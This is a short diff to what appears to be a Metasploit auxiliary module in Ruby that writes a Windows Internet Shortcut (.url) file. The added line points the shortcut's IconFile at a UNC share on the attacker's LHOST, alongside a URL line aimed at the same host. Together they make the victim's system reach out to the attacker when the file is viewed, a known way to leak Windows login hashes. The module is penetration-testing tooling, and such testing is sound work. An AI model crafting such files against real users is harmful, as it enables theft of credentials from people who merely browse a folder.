@@ -136,6 +136,7 @@ class MetasploitModule < Msf::Auxiliary
     url=""
     url << "[InternetShortcut]\n"
     url << "URL=file://#{datastore['LHOST']}/url.html"
+    url << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"
 
     file_create(url)
   end
